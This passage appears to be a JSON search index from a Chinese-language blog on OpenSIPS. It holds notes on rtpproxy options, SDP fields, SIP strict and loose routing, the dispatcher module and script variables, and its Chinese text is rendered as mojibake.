é»˜è®¤æƒ…å†µä¸‹ï¼Œrtpproxyä¼šè­¦å‘Šç”¨æˆ·ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½è¿è¡Œrtpproxyå¹¶ä¸”ä¸å…è®¸è¿œç¨‹æ§åˆ¶ã€‚ä½¿ç”¨-Få¯ä»¥å…³é—­è¿™ä¸ªé™åˆ¶ -m æœ€å°ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤35000 -m 20000 -M æœ€å¤§ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤65000 -M 50000 -L å•ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ã€‚rtpproxyè¦æ±‚æ¯ä¸ªsessionä½¿ç”¨4ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ -L 20000 -d æ—¥å¿—çº§åˆ«ï¼Œå¯é€‰DBUG, INFO, WARN, ERR and CRIT, é»˜è®¤DBUG -d ERR -A å¹¿æ’­åœ°å€ï¼Œç”¨äºrtpprxyåœ¨NATé˜²ç«å¢™å†…éƒ¨æ—¶ä½¿ç”¨ -A 171.16.200.13 -f è®©rtpproxyå‰å°è¿è¡Œï¼Œåœ¨åšrtpproxyå®¹å™¨åŒ–æ—¶ï¼Œå¯åŠ¨è„šæœ¬å¿…é¡»å¸¦æœ‰-fï¼Œå¦åˆ™å®¹å™¨è¿è¡Œåä¼šç«‹å³é€€å‡º -V è¾“å‡ºrtpproxyçš„ç‰ˆæœ¬ å‚è€ƒ https://www.rtpproxy.org/ https://www.","title":"rtpproxyå­¦ä¹ "},{"content":"sdpæ —å­ v=0 o=- 7158718066157017333 2 IN IP4 127.0.0.1 s=- t=0 0 a=group:BUNDLE 0 a=msid-semantic: WMS byn72RFJBCUzdSPhnaBU4vSz7LFwfwNaF2Sy m=audio 64030 UDP/TLS/RTP/SAVPF 111 103 104 9 0 8 106 105 13 110 112 113 126 c=IN IP4 192.168.2.180 Sessionæè¿° **\nv= (protocol version number, currently only 0) o= (originator and session identifier : username, id, version number, network address) s= (session name : mandatory with at least one UTF-8-encoded character) i=* (session title or short information) u=* (URI of description) e=* (zero or more email address with optional name of contacts) p=* (zero or more phone number with optional name of contacts) c=* (connection informationâ€”not required if included in all media) b=* (zero or more bandwidth information lines) One or more Time descriptions (\u0026#34;t=\u0026#34; and \u0026#34;r=\u0026#34; lines; see below) z=* (time zone adjustments) k=* (encryption key) a=* (zero or more session attribute lines) Zero or more Media descriptions (each one starting by an \u0026#34;m=\u0026#34; line; see below) æ—¶é—´æè¿°(å¿…é¡») t= (time the session is active) r=* (zero or more repeat times) åª’ä½“æè¿°(å¯é€‰) m= (media name and transport address) i=* (media title or information field) c=* (connection information â€” optional if included at session level) b=* (zero or more bandwidth information lines) k=* (encryption key) a=* (zero or more media attribute lines â€” overriding the Session attribute lines) ","permalink":"https://wdd.js.org/opensips/ch9/sdp/","summary":"sdpæ —å­ v=0 o=- 7158718066157017333 2 IN IP4 127.0.0.1 s=- t=0 0 a=group:BUNDLE 0 a=msid-semantic: WMS byn72RFJBCUzdSPhnaBU4vSz7LFwfwNaF2Sy m=audio 64030 UDP/TLS/RTP/SAVPF 111 103 104 9 0 8 106 105 13 110 112 113 126 c=IN IP4 192.168.2.180 Sessionæè¿° **\nv= (protocol version number, currently only 0) o= (originator and session identifier : username, id, version number, network address) s= (session name : mandatory with at least one UTF-8-encoded character) i=* (session title or short information) u=* (URI of description) e=* (zero or more email address with optional name of contacts) p=* (zero or more phone number with optional name of contacts) c=* (connection informationâ€”not required if included in all media) b=* (zero or more bandwidth information lines) One or more Time descriptions (\u0026#34;t=\u0026#34; and \u0026#34;r=\u0026#34; lines; see below) z=* (time zone adjustments) k=* (encryption key) a=* (zero or more session attribute lines) Zero or more Media descriptions (each one starting by an \u0026#34;m=\u0026#34; line; see below) æ—¶é—´æè¿°(å¿…é¡») t= (time the session is active) r=* (zero or more repeat times) åª’ä½“æè¿°(å¯é€‰) m= (media name and transport address) i=* (media title or information field) c=* (connection information â€” optional if included at session level) b=* (zero or more bandwidth information lines) k=* (encryption key) a=* (zero or more media attribute lines â€” overriding the Session attribute lines) ","title":"sdpåè®®ç®€ä»‹"},{"content":" Building Telephony Systems with OpenSIPSÂ Second Edition SIP: Session Initiation Protocol Session Initiation Protocol (SIP) Basic Call Flow Examples Re-INVITE and Target-Refresh Request Handling in the Session Initiation Protocol (SIP)Â SDP: Session Description Protocol freeswitchæƒå¨æŒ‡å— SIP: Understanding the Session Initiation Protocol, Third Edition (Artech House Telecommunications) https://tools.ietf.org/html/rfc4028 Hacking VoIP: Protocols, Attacks, and Countermeasures ","permalink":"https://wdd.js.org/opensips/ch9/books/","summary":" Building Telephony Systems with OpenSIPSÂ Second Edition SIP: Session Initiation Protocol Session Initiation Protocol (SIP) Basic Call Flow Examples Re-INVITE and Target-Refresh Request Handling in the Session Initiation Protocol (SIP)Â SDP: Session Description Protocol freeswitchæƒå¨æŒ‡å— SIP: Understanding the Session Initiation Protocol, Third Edition (Artech House Telecommunications) https://tools.ietf.org/html/rfc4028 Hacking VoIP: Protocols, Attacks, and Countermeasures ","title":"å‚è€ƒèµ„æ–™ä¸ä¹¦ç±"},{"content":" æ“ä½œ æ— çŠ¶æ€ æœ‰çŠ¶æ€ SIP forward forward() t_relay() SIP replying sl_send_reply() t_reply() Create transaction t_newtran() Match transcation t_check_trans() ","permalink":"https://wdd.js.org/opensips/ch5/stateful-stateless/","summary":" æ“ä½œ æ— çŠ¶æ€ æœ‰çŠ¶æ€ SIP forward forward() t_relay() SIP replying sl_send_reply() t_reply() Create transaction t_newtran() Match transcation t_check_trans() ","title":"æœ‰çŠ¶æ€å’Œæ— çŠ¶æ€è·¯ç”±"},{"content":"æ¾æ•£è·¯ç”±æ˜¯sip 2ç‰ˆæœ¬çš„æ–°çš„è·¯ç”±æ–¹æ³•ã€‚ä¸¥æ ¼è·¯ç”±æ˜¯è€çš„è·¯ç”±æ–¹æ³•ã€‚\nå¦‚ä½•ä»sipæ¶ˆæ¯ä¸­åŒºåˆ†ä¸¥æ ¼è·¯ç”±å’Œæ¾æ•£è·¯ç”± ä¸‹å›¾sipæ¶ˆæ¯ä¸­Routeå­—æ®µä¸­å¸¦æœ‰**lr,Â **åˆ™è¯´æ˜è¿™æ˜¯æ¾æ•£è·¯ç”±ã€‚\nREGISTER sip:127.0.0.1 SIP/2.0 Via: SIP/2.0/UDP 127.0.0.1:58979;rport;branch=z9hG4bKPjMRzNdeTKn9rHNDtyJuVoyrDb84.cPtL8 Route: \u0026lt;sip:127.0.0.1;lr\u0026gt; Max-Forwards: 70 From: \u0026#34;1001\u0026#34; \u0026lt;sip:1001@172.17.0.2\u0026gt;;tag=oqkOzbQYd9cx5vXFjUnB1WufgWUZZxtZ To: \u0026#34;1001\u0026#34; \u0026lt;sip:1001@172.17.0.2\u0026gt; åŠŸèƒ½ä¸Šçš„åŒºåˆ« ä¸¥æ ¼è·¯ç”±ï¼Œsipè¯·æ±‚ç»è¿‡uasåï¼Œinvite urlæ¯æ¬¡éƒ½ä¼šè¢«é‡å†™ã€‚\næ¾æ•£è·¯ç”±ï¼Œsipè¯·æ±‚ç»è¿‡uasåï¼Œinvite urlä¸å˜ã€‚\n#1 invite INVITE sip:callee@domain.com SIP/2.0 Contact: sip:caller@u1.example.com #2 invite INVITE sip:callee@domain.com SIP/2.0 Contact: sip:caller@u1.example.com Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; #3 invite INVITE sip:callee@u2.domain.com SIP/2.0 Contact: sip:caller@u1.example.com Record-Route: \u0026lt;sip:p2.domain.com;lr\u0026gt; Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; #4 200 ok SIP/2.0 200 OK Contact: sip:callee@u2.domain.com Record-Route: \u0026lt;sip:p2.domain.com;lr\u0026gt; Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; #7 bye BYE sip:callee@u2.domain.com SIP/2.0 Route: \u0026lt;sip:p1.example.com;lr\u0026gt;,\u0026lt;sip:p2.domain.com;lr\u0026gt; #8 bye BYE sip:callee@u2.domain.com SIP/2.0 Route: \u0026lt;sip:p2.domain.com;lr\u0026gt; #9 bye BYE sip:callee@u2.domain.com SIP/2.0 Traversing a Strict-Routing Proxy ","permalink":"https://wdd.js.org/opensips/ch5/strict-loose-routing/","summary":"æ¾æ•£è·¯ç”±æ˜¯sip 2ç‰ˆæœ¬çš„æ–°çš„è·¯ç”±æ–¹æ³•ã€‚ä¸¥æ ¼è·¯ç”±æ˜¯è€çš„è·¯ç”±æ–¹æ³•ã€‚\nå¦‚ä½•ä»sipæ¶ˆæ¯ä¸­åŒºåˆ†ä¸¥æ ¼è·¯ç”±å’Œæ¾æ•£è·¯ç”± ä¸‹å›¾sipæ¶ˆæ¯ä¸­Routeå­—æ®µä¸­å¸¦æœ‰**lr,Â **åˆ™è¯´æ˜è¿™æ˜¯æ¾æ•£è·¯ç”±ã€‚\nREGISTER sip:127.0.0.1 SIP/2.0 Via: SIP/2.0/UDP 127.0.0.1:58979;rport;branch=z9hG4bKPjMRzNdeTKn9rHNDtyJuVoyrDb84.cPtL8 Route: \u0026lt;sip:127.0.0.1;lr\u0026gt; Max-Forwards: 70 From: \u0026#34;1001\u0026#34; \u0026lt;sip:1001@172.17.0.2\u0026gt;;tag=oqkOzbQYd9cx5vXFjUnB1WufgWUZZxtZ To: \u0026#34;1001\u0026#34; \u0026lt;sip:1001@172.17.0.2\u0026gt; åŠŸèƒ½ä¸Šçš„åŒºåˆ« ä¸¥æ ¼è·¯ç”±ï¼Œsipè¯·æ±‚ç»è¿‡uasåï¼Œinvite urlæ¯æ¬¡éƒ½ä¼šè¢«é‡å†™ã€‚\næ¾æ•£è·¯ç”±ï¼Œsipè¯·æ±‚ç»è¿‡uasåï¼Œinvite urlä¸å˜ã€‚\n#1 invite INVITE sip:callee@domain.com SIP/2.0 Contact: sip:caller@u1.example.com #2 invite INVITE sip:callee@domain.com SIP/2.0 Contact: sip:caller@u1.example.com Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; #3 invite INVITE sip:callee@u2.domain.com SIP/2.0 Contact: sip:caller@u1.example.com Record-Route: \u0026lt;sip:p2.domain.com;lr\u0026gt; Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; #4 200 ok SIP/2.0 200 OK Contact: sip:callee@u2.domain.com Record-Route: \u0026lt;sip:p2.domain.com;lr\u0026gt; Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; #7 bye BYE sip:callee@u2.domain.com SIP/2.0 Route: \u0026lt;sip:p1.","title":"ä¸¥æ ¼è·¯ç”±å’Œæ¾æ•£è·¯ç”±"},{"content":"dispatcheræ¨¡å—ç”¨æ¥åˆ†å‘sipæ¶ˆæ¯ã€‚\ndispatcherå¦‚ä½•è®°å½•ç›®çš„åœ°çŠ¶æ€ dispatcherä¼šä½¿ç”¨ä¸€å¼ è¡¨ã€‚\néœ€è¦å…³æ³¨ä¸¤ä¸ªå­—æ®µdestionationsï¼Œ stateã€‚\ndestionationsè¡¨ç¤ºsipæ¶ˆæ¯è¦å‘å¾€çš„ç›®çš„åœ° stateè¡¨ç¤ºå¯¹ç›®çš„åœ°çš„çŠ¶æ€æ£€æµ‹ç»“æœ 0 å¯ç”¨ 1 ä¸å¯ç”¨ 2 è¡¨ç¤ºæ­£åœ¨æ£€æµ‹ opensipsåªä¼šæƒ³å¯ç”¨çš„ç›®çš„åœ°è½¬å‘sipæ¶ˆæ¯\nid setid destionations state 1 1 sip:p1:5060 0 2 1 sip:p2:5060 1 3 1 sip:p2:5061 2 dispatcherå¦‚ä½•æ£€æµ‹ç›®çš„åœ°çš„çŠ¶æ€ æœ¬åœ°çš„opensipsä¼šå‘¨æœŸæ€§çš„å‘ç›®çš„åœ°å‘é€optionsåŒ…ï¼Œå¦‚æœå¯¹æ–¹ç«‹å³è¿”å›200ok, å°±è¯´æ˜ç›®çš„åœ°å¯ç”¨ã€‚\nåœ¨è¾¾åˆ°ä¸€å®šé˜ˆå€¼åï¼Œç›®çš„åœ°ä¸€ç›´æ— å“åº”ï¼Œåˆ™opensipså°†å…¶è®¾ç½®ä¸ºä¸å¯ç”¨çŠ¶æ€ï¼Œæˆ–è€…æ­£åœ¨æ£€æµ‹çŠ¶æ€ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º\nä»£ç ä¾‹å­ ds_select_dst()å‡½æ•°ä¼šå»é€‰æ‹©å¯ç”¨çš„ç›®çš„åœ°ï¼Œå¹¶ä¸”è®¾ç½®å½“å‰sipæ¶ˆæ¯çš„è½¬å‘åœ°å€ã€‚å¦‚æœå‘ç°æ— ç”¨å¯è½¬å‘åœ°å€ï¼Œåˆ™è¿›å…¥504 æœåŠ¡ä¸å¯ç”¨çš„é€»è¾‘ã€‚\nå¦‚æœsipç»ˆç«¯æ³¨å†Œæ—¶è¿”å›504ï¼Œåˆ™å¯ä»¥ä»dispatcheræ¨¡å—ï¼Œæ’æŸ¥çœ‹çœ‹æ˜¯ä¸æ˜¯æ‰€æœ‰çš„ç›®çš„åœ°éƒ½å¤„äºä¸å¯ç”¨çŠ¶æ€ã€‚\nif (!ds_select_dst(\u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;)) { send_reply(\u0026#34;504\u0026#34;,\u0026#34;Service Unavailable\u0026#34;); exit; } ","permalink":"https://wdd.js.org/opensips/ch6/dispatcher/","summary":"dispatcheræ¨¡å—ç”¨æ¥åˆ†å‘sipæ¶ˆæ¯ã€‚\ndispatcherå¦‚ä½•è®°å½•ç›®çš„åœ°çŠ¶æ€ dispatcherä¼šä½¿ç”¨ä¸€å¼ è¡¨ã€‚\néœ€è¦å…³æ³¨ä¸¤ä¸ªå­—æ®µdestionationsï¼Œ stateã€‚\ndestionationsè¡¨ç¤ºsipæ¶ˆæ¯è¦å‘å¾€çš„ç›®çš„åœ° stateè¡¨ç¤ºå¯¹ç›®çš„åœ°çš„çŠ¶æ€æ£€æµ‹ç»“æœ 0 å¯ç”¨ 1 ä¸å¯ç”¨ 2 è¡¨ç¤ºæ­£åœ¨æ£€æµ‹ opensipsåªä¼šæƒ³å¯ç”¨çš„ç›®çš„åœ°è½¬å‘sipæ¶ˆæ¯\nid setid destionations state 1 1 sip:p1:5060 0 2 1 sip:p2:5060 1 3 1 sip:p2:5061 2 dispatcherå¦‚ä½•æ£€æµ‹ç›®çš„åœ°çš„çŠ¶æ€ æœ¬åœ°çš„opensipsä¼šå‘¨æœŸæ€§çš„å‘ç›®çš„åœ°å‘é€optionsåŒ…ï¼Œå¦‚æœå¯¹æ–¹ç«‹å³è¿”å›200ok, å°±è¯´æ˜ç›®çš„åœ°å¯ç”¨ã€‚\nåœ¨è¾¾åˆ°ä¸€å®šé˜ˆå€¼åï¼Œç›®çš„åœ°ä¸€ç›´æ— å“åº”ï¼Œåˆ™opensipså°†å…¶è®¾ç½®ä¸ºä¸å¯ç”¨çŠ¶æ€ï¼Œæˆ–è€…æ­£åœ¨æ£€æµ‹çŠ¶æ€ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º\nä»£ç ä¾‹å­ ds_select_dst()å‡½æ•°ä¼šå»é€‰æ‹©å¯ç”¨çš„ç›®çš„åœ°ï¼Œå¹¶ä¸”è®¾ç½®å½“å‰sipæ¶ˆæ¯çš„è½¬å‘åœ°å€ã€‚å¦‚æœå‘ç°æ— ç”¨å¯è½¬å‘åœ°å€ï¼Œåˆ™è¿›å…¥504 æœåŠ¡ä¸å¯ç”¨çš„é€»è¾‘ã€‚\nå¦‚æœsipç»ˆç«¯æ³¨å†Œæ—¶è¿”å›504ï¼Œåˆ™å¯ä»¥ä»dispatcheræ¨¡å—ï¼Œæ’æŸ¥çœ‹çœ‹æ˜¯ä¸æ˜¯æ‰€æœ‰çš„ç›®çš„åœ°éƒ½å¤„äºä¸å¯ç”¨çŠ¶æ€ã€‚\nif (!ds_select_dst(\u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;)) { send_reply(\u0026#34;504\u0026#34;,\u0026#34;Service Unavailable\u0026#34;); exit; } ","title":"sipæ¶ˆæ¯åˆ†å‘ä¹‹dispatcheræ¨¡å—"},{"content":"å˜é‡çš„ä½¿ç”¨æ–¹å¼ $(\u0026lt;context\u0026gt;type(name)[index]{transformation}) å˜é‡éƒ½ä»¥$ç¬¦å·å¼€å¤´ typeè¡¨ç¤ºå˜é‡çš„ç±»å‹ï¼šæ ¸å¿ƒå˜é‡ï¼Œè‡ªå®šä¹‰å˜é‡ï¼Œé”®å€¼å¯¹å˜é‡ nameè¡¨ç¤ºå˜é‡åï¼šå¦‚$var(name), $avp(age) indexè¡¨ç¤ºéœ€è¦ï¼Œæœ‰äº›å˜é‡ç±»ä¼¼äºæ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨éœ€è¦æ¥æŒ‡å®šã€‚éœ€è¦å¯ä»¥ç”¨æ­£æ•°å’Œè´Ÿæ•°ï¼Œå¦‚-1è¡¨ç¤ºæœ€åä¸€ä¸ªå…ƒç´  transformationsè¡¨ç¤ºç±»å‹è½¬æ¢ï¼Œå¦‚è·å–ä¸€ä¸ªå­—ç¬¦ä¸²å€¼çš„é•¿åº¦ï¼Œå¤§å°å†™è½¬æ¢ç­‰æ“ä½œ contextè¡¨ç¤ºå˜é‡å­˜åœ¨çš„ä½œç”¨åŸŸï¼Œopensipsæœ‰è¯·æ±‚çš„ä½œç”¨åŸŸå’Œå“åº”çš„ä½œç”¨åŸŸ # by type $ru # type type and name $hdr(Contact) # bye type and index $(ct[0]) # by type name and index $(avp(gw_ip)[2]) # by context $(\u0026lt;request\u0026gt;ru) $(\u0026lt;reply\u0026gt;hdr(Contact)) å¼•ç”¨å˜é‡ æ‰€æœ‰çš„å¼•ç”¨å˜é‡éƒ½æ˜¯å¯è¯»çš„ï¼Œä½†æ˜¯åªæœ‰éƒ¨åˆ†å˜é‡å¯ä»¥ä¿®æ”¹ã€‚å¼•ç”¨å˜é‡ä¸€èˆ¬éƒ½æ˜¯è‹±æ–‡å«ä¹‰çš„é¦–å­—æ¯ç¼©å†™ï¼Œåˆšå¼€å§‹æ¥è§¦opensipsçš„åŒå­¦å¯èƒ½å¾ˆä¸ä¹ æƒ¯ã€‚å®é™…ä¸Šé€šè¿‡é¦–å­—æ¯å¤§æ¦‚æ˜¯å¯ä»¥çŒœå‡ºå˜é‡çš„å«ä¹‰çš„ã€‚\nå¿…é¡»è®°ä½å˜é‡çš„ç”¨é»„è‰²æ ‡è®°ã€‚\nå˜é‡å è‹±æ–‡å«ä¹‰ ä¸­æ–‡è§£é‡Š æ˜¯å¦å¯ä¿®æ”¹ $ru request url è¯·æ±‚url æ˜¯ $rU Username in SIP Request\u0026rsquo;s URI æ˜¯ $ci call id callId $hdr(from) request headers fromÂ è¯·æ±‚å¤´ä¸­çš„fromå­—æ®µ æ˜¯ $Ts current time unix Timestamp å½“å‰æ—¶é—´çš„unixæ—¶é—´æˆ³ $branch Branch $cl Content-Length $cs CSeq number $cT Content-Type $dd Domain of destination URI ç›®æ ‡åœ°å€çš„åŸŸå æ˜¯ $di Diversion header URI $dp Port of destination URI ç›®æ ‡åœ°å€çš„ç«¯å£ æ˜¯ $dP Transport protocol of destination URI ä¼ è¾“åè®® $du Destination URI ç›®æ ‡åœ°å€ æ˜¯ $fd From URI domain $fn From display name $ft From tag $fu From URI $fU From URI username $mb SIP message buffer $mf Message Flags $mi SIP message ID $ml SIP message length $od Domain in SIP Request\u0026rsquo;s original URI $op Port of SIP request\u0026rsquo;s original URI $oP Transport protocol of SIP request original URI $ou SIP Request\u0026rsquo;s original URI $oU Username in SIP Request\u0026rsquo;s original URI $param(idx)Â Route parameter $pp Process id $rd Domain in SIP Request\u0026rsquo;s URI $rb Body of request/reply æ˜¯ $rc Returned code $re Remote-Party-ID header URI $rm SIP request\u0026rsquo;s method $rp SIP request\u0026rsquo;s port æ˜¯ $rP Transport protocol of SIP request URI $rr SIP reply\u0026rsquo;s reason $rs SIP reply\u0026rsquo;s status $rt reference to URI of refer-to header $RiÂ Received IP address $Rp Received port $sf Script flags $si IP source address $sp Source port $td To URI Domain $tn To display name $tt To tag $tu To URI $tU To URI Username $TF String formatted time $TS Startup unix time stamp $ua User agent header æ›´å¤šå˜é‡å¯ä»¥å‚è€ƒï¼šhttps://www.opensips.org/Documentation/Script-CoreVar-2-4\né”®å€¼å¯¹å˜é‡ é”®å€¼å¯¹å˜é‡æ˜¯æŒ‰éœ€åˆ›å»ºçš„ é”®å€¼å¯¹åªèƒ½ç”¨äºæœ‰çŠ¶æ€çš„è·¯ç”±å¤„ç†ä¸­ é”®å€¼å¯¹ä¼šç»‘å®šåˆ°æŒ‡å®šçš„æ¶ˆæ¯æˆ–è€…äº‹åŠ¡ä¸Š é”®å€¼å¯¹åˆå§‹åŒ–æ—¶æ˜¯ç©ºå€¼ é”®å€¼å¯¹å¯ä»¥åœ¨æ‰€æœ‰çš„è·¯ç”±ä¸­è¯»å†™ åœ¨å“åº”è·¯ç”±ä¸­ä½¿ç”¨é”®å€¼å¯¹ï¼Œéœ€è¦åŠ è½½tmæ¨¡å—ï¼Œå¹¶ä¸”è®¾ç½®onreply_avp_ modeå‚æ•° é”®å€¼å¯¹å¯ä»¥è¯»å†™ï¼Œä¹Ÿå¯ä»¥åˆ é™¤ å¯ä»¥æŠŠé”®å€¼å¯¹ç†è§£ä¸ºkeyä¸ºhash, å€¼ä¸ºå †æ ˆçš„æ•°æ®ç»“æ„ $avp(my_name) = \u0026#34;wang\u0026#34; $avp(my_name) = \u0026#34;duan\u0026#34; xlog(\u0026#34;$avp(my_name)\u0026#34;) # duan xlog(\u0026#34;$avp(my_name)[0]\u0026#34;) # wang xlog(\u0026#34;$avp(my_name)[*]\u0026#34;) # wang duanduan è„šæœ¬å˜é‡ è„šæœ¬å˜é‡åªå­˜åœ¨äºå½“å‰ä¸»è·¯ç”±åŠå…¶å­è·¯ç”±ä¸­ã€‚è·¯ç”±ç»“æŸï¼Œè„šæœ¬å˜é‡å°†å›æ”¶ã€‚ è„šæœ¬å˜é‡éœ€è¦æŒ‡å®šåˆå§‹åŒ–å€¼ï¼Œå¦åˆ™å˜é‡çš„å€¼å°†ä¸ç¡®å®šã€‚ è„šæœ¬å˜é‡åªèƒ½æœ‰ä¸€ä¸ªå€¼ è„šæœ¬å˜é‡è¯»å–è¦æ¯”é”®å€¼å¯¹å˜é‡å¿«ï¼Œè„šæœ¬å˜é‡ç›´æ¥å¼•ç”¨å†…å­˜çš„ä½ç½® å¦‚æœéœ€è¦å˜é‡ï¼Œå¯ä»¥ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è„šæœ¬å˜é‡ $var(my_name) = \u0026#34;wangduanduan\u0026#34; $var(log_msg) = $var(my_name) + $ci + $fu xlog(\u0026#34;$var(log_msg)\u0026#34;) è„šæœ¬ç¿»è¯‘ è„šæœ¬ç¿»è¯‘å¯ä»¥ç†è§£ä¸ºä¸€ç§å·¥å…·å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è·å–å­—ç¬¦ä¸²é•¿åº¦ï¼Œè·å–å­—ç¬¦ä¸²çš„å­å­—ç¬¦ç­‰ç­‰æ“ä½œã€‚\nè·å–å­—ç¬¦ä¸²é•¿åº¦ $(fu{s.len}) å­—ç¬¦ä¸²æˆªå–å­ä¸² $(var(x){s.substr,5,2}) è·å–å­—ç¬¦ä¸²çš„æŸéƒ¨åˆ† $(avp(my_uri){uri.user}) å°†å­—ç¬¦ä¸²å€¼è½¬ä¸ºæ•´æ•° $(var(x){s.int}) ç¿»è¯‘ä¹Ÿå¯ä»¥é“¾å¼è°ƒç”¨ $(hdr(Test){s.escape.common}{s.len}) ","permalink":"https://wdd.js.org/opensips/ch5/var/","summary":"å˜é‡çš„ä½¿ç”¨æ–¹å¼ $(\u0026lt;context\u0026gt;type(name)[index]{transformation}) å˜é‡éƒ½ä»¥$ç¬¦å·å¼€å¤´ typeè¡¨ç¤ºå˜é‡çš„ç±»å‹ï¼šæ ¸å¿ƒå˜é‡ï¼Œè‡ªå®šä¹‰å˜é‡ï¼Œé”®å€¼å¯¹å˜é‡ nameè¡¨ç¤ºå˜é‡åï¼šå¦‚$var(name), $avp(age) indexè¡¨ç¤ºéœ€è¦ï¼Œæœ‰äº›å˜é‡ç±»ä¼¼äºæ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨éœ€è¦æ¥æŒ‡å®šã€‚éœ€è¦å¯ä»¥ç”¨æ­£æ•°å’Œè´Ÿæ•°ï¼Œå¦‚-1è¡¨ç¤ºæœ€åä¸€ä¸ªå…ƒç´  transformationsè¡¨ç¤ºç±»å‹è½¬æ¢ï¼Œå¦‚è·å–ä¸€ä¸ªå­—ç¬¦ä¸²å€¼çš„é•¿åº¦ï¼Œå¤§å°å†™è½¬æ¢ç­‰æ“ä½œ contextè¡¨ç¤ºå˜é‡å­˜åœ¨çš„ä½œç”¨åŸŸï¼Œopensipsæœ‰è¯·æ±‚çš„ä½œç”¨åŸŸå’Œå“åº”çš„ä½œç”¨åŸŸ # by type $ru # type type and name $hdr(Contact) # bye type and index $(ct[0]) # by type name and index $(avp(gw_ip)[2]) # by context $(\u0026lt;request\u0026gt;ru) $(\u0026lt;reply\u0026gt;hdr(Contact)) å¼•ç”¨å˜é‡ æ‰€æœ‰çš„å¼•ç”¨å˜é‡éƒ½æ˜¯å¯è¯»çš„ï¼Œä½†æ˜¯åªæœ‰éƒ¨åˆ†å˜é‡å¯ä»¥ä¿®æ”¹ã€‚å¼•ç”¨å˜é‡ä¸€èˆ¬éƒ½æ˜¯è‹±æ–‡å«ä¹‰çš„é¦–å­—æ¯ç¼©å†™ï¼Œåˆšå¼€å§‹æ¥è§¦opensipsçš„åŒå­¦å¯èƒ½å¾ˆä¸ä¹ æƒ¯ã€‚å®é™…ä¸Šé€šè¿‡é¦–å­—æ¯å¤§æ¦‚æ˜¯å¯ä»¥çŒœå‡ºå˜é‡çš„å«ä¹‰çš„ã€‚\nå¿…é¡»è®°ä½å˜é‡çš„ç”¨é»„è‰²æ ‡è®°ã€‚\nå˜é‡å è‹±æ–‡å«ä¹‰ ä¸­æ–‡è§£é‡Š æ˜¯å¦å¯ä¿®æ”¹ $ru request url è¯·æ±‚url æ˜¯ $rU Username in SIP Request\u0026rsquo;s URI æ˜¯ $ci call id callId $hdr(from) request headers fromÂ è¯·æ±‚å¤´ä¸­çš„fromå­—æ®µ æ˜¯ $Ts current time unix Timestamp å½“å‰æ—¶é—´çš„unixæ—¶é—´æˆ³ $branch Branch $cl Content-Length $cs CSeq number $cT Content-Type $dd Domain of destination URI ç›®æ ‡åœ°å€çš„åŸŸå æ˜¯ $di Diversion header URI $dp Port of destination URI ç›®æ ‡åœ°å€çš„ç«¯å£ æ˜¯ $dP Transport protocol of destination URI ä¼ è¾“åè®® $du Destination URI ç›®æ ‡åœ°å€ æ˜¯ $fd From URI domain $fn From display name $ft From tag $fu From URI $fU From URI username $mb SIP message buffer $mf Message Flags $mi SIP message ID $ml SIP message length $od Domain in SIP Request\u0026rsquo;s original URI $op Port of SIP request\u0026rsquo;s original URI $oP Transport protocol of SIP request original URI $ou SIP Request\u0026rsquo;s original URI $oU Username in SIP Request\u0026rsquo;s original URI $param(idx)Â Route parameter $pp Process id $rd Domain in SIP Request\u0026rsquo;s URI $rb Body of request/reply æ˜¯ $rc Returned code $re Remote-Party-ID header URI $rm SIP request\u0026rsquo;s method $rp SIP request\u0026rsquo;s port æ˜¯ $rP Transport protocol of SIP request URI $rr SIP reply\u0026rsquo;s reason $rs SIP reply\u0026rsquo;s status $rt reference to URI of refer-to header $RiÂ Received IP address $Rp Received port $sf Script flags $si IP source address $sp Source port $td To URI Domain $tn To display name $tt To tag $tu To URI $tU To URI Username $TF String formatted time $TS Startup unix time stamp $ua User agent header æ›´å¤šå˜é‡å¯ä»¥å‚è€ƒï¼šhttps://www.","title":"å˜é‡çš„ä½¿ç”¨"},{"content":" æŒæ¡è·¯ç”±è§¦å‘æ—¶æœºçš„å…³é”®æ˜¯ä»¥ä¸‹å‡ ç‚¹\næ¶ˆæ¯æ˜¯è¯·æ±‚è¿˜æ˜¯å“åº” æ¶ˆæ¯æ˜¯è¿›å…¥opensipsçš„(incoming)ï¼Œè¿˜æ˜¯ç¦»å¼€opensipsçš„(outgoing) ä»opensipså‘å‡ºå»çš„ackè¯·æ±‚ï¼Œä¸ä¼šè§¦å‘ä»»ä½•è·¯ç”± **è¿›å…¥opensips(**incoming) ç¦»å¼€opensips(outgoing) è¯·æ±‚ è§¦å‘è¯·æ±‚è·¯ç”±ï¼šä¾‹å¦‚invite, register, ack è§¦å‘åˆ†æ”¯è·¯ç”±ã€‚å¦‚inviteçš„è½¬å‘ å“åº” è§¦å‘å“åº”è·¯ç”±ã€‚å¦‚æœæ˜¯å¤§äºç­‰äº300çš„å“åº”ï¼Œè¿˜ä¼šè§¦å‘å¤±è´¥è·¯ç”±ã€‚ ä¸ä¼šè§¦å‘ä»»ä½•è·¯ç”± ","permalink":"https://wdd.js.org/opensips/ch5/triger-time/","summary":" æŒæ¡è·¯ç”±è§¦å‘æ—¶æœºçš„å…³é”®æ˜¯ä»¥ä¸‹å‡ ç‚¹\næ¶ˆæ¯æ˜¯è¯·æ±‚è¿˜æ˜¯å“åº” æ¶ˆæ¯æ˜¯è¿›å…¥opensipsçš„(incoming)ï¼Œè¿˜æ˜¯ç¦»å¼€opensipsçš„(outgoing) ä»opensipså‘å‡ºå»çš„ackè¯·æ±‚ï¼Œä¸ä¼šè§¦å‘ä»»ä½•è·¯ç”± 